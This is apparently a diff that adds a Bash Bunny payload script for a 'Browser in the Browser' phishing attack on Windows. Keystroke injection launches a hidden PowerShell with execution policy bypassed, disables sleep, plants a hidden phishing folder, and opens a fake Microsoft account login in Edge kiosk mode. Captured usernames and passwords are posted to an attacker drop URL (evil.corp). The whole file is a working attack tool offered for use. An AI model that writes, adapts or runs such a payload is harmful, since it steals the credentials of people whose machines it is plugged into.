@@ -1,0 +1,103 @@
+#!/bin/bash
+#
+# Title:            "Microsoft Windows" Browser in the Browser (BitB)
+#
+# Description:     
+#                   1) Hide "PowerShell" window.
+#                   2) Change "monitor-timeout (AC and DC)" at NEVER with "powercfg" utility.
+#                   3) Change "standby-timeout (AC and DC)" at NEVER with "powercfg" utility.
+#                   4) Copies and hides the phishing folder in the current user's directory.
+#                   5) Full screen opening of the phishing HTML page using "Microsoft Edge" in kiosk mode.
+#                   6) The username/password will be sent by HTTP POST to the URL specified in the "DROP_URL" constant.
+#
+# Author:           TW-D
+# Version:          1.0
+# Category:         Phishing
+# Target:           Microsoft Windows
+# Attackmodes:      HID and STORAGE
+#
+# TESTED ON
+# ===============
+# Microsoft Windows 10 Family Version 20H2 (PowerShell 5.1)
+# Microsoft Windows 10 Professional Version 20H2 (PowerShell 5.1)
+#
+# NOTE
+# ===============
+# Microsoft Edge is required on the target machine.
+#
+# STATUS
+# ===============
+# Magenta solid ................................... SETUP
+# Yellow single blink ............................. ATTACK
+# Yellow double blink ............................. STAGE2
+# Yellow triple blink ............................. STAGE3
+# White fast blink ................................ CLEANUP
+# Green 1000ms VERYFAST blink followed by SOLID ... FINISH
+#
+
+######## INITIALIZATION ########
+
+readonly BB_LABEL="BashBunny"
+
+# Choose "dark" or "light"
+#
+readonly BITB_THEME="dark"
+
+# Title of the window
+#
+readonly BITB_TITLE="Outlook - free personal email and calendar from Microsoft"
+
+# URL in the address bar
+#
+readonly BITB_URL="https://login.live.com/login.srf?wa=wsignin1.0&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%253a%252f%252foutlook.live.com%252fowa%252f"
+
+# Content of the navigation window
+#
+readonly BITB_TEMPLATE="microsoft-account.html"
+
+# Destination of the form data
+#
+readonly DROP_URL="http://evil.corp:8080/drop.php?ZXZpbC5jb3Jw.png"
+
+######## SETUP ########
+
+LED SETUP
+
+ATTACKMODE HID STORAGE
+GET SWITCH_POSITION
+
+######## ATTACK ########
+
+LED ATTACK
+
+Q DELAY 8000
+RUN WIN "powershell -NoLogo -NoProfile -ExecutionPolicy Bypass"
+Q DELAY 4000
+
+LED STAGE2
+
+Q STRING "\$BB_VOLUME = \"\$((Get-WmiObject -Class Win32_Volume -Filter \"Label LIKE '${BB_LABEL}'\").Name)payloads\\${SWITCH_POSITION}\\\""
+Q ENTER
+Q DELAY 3000
+
+Q STRING "CD \"\${BB_VOLUME}\""
+Q ENTER
+Q DELAY 1500
+
+LED STAGE3
+
+Q STRING ".\payload.ps1 -BITB_THEME \"${BITB_THEME}\" -BITB_TITLE \"${BITB_TITLE}\" -BITB_URL \"${BITB_URL}\" -BITB_TEMPLATE \"${BITB_TEMPLATE}\" -DROP_URL \"${DROP_URL}\""
+Q ENTER
+Q DELAY 3000
+
+######## CLEANUP ########
+
+LED CLEANUP
+
+sync
+
+######## FINISH ########
+
+LED FINISH
+
+shutdown -h 0
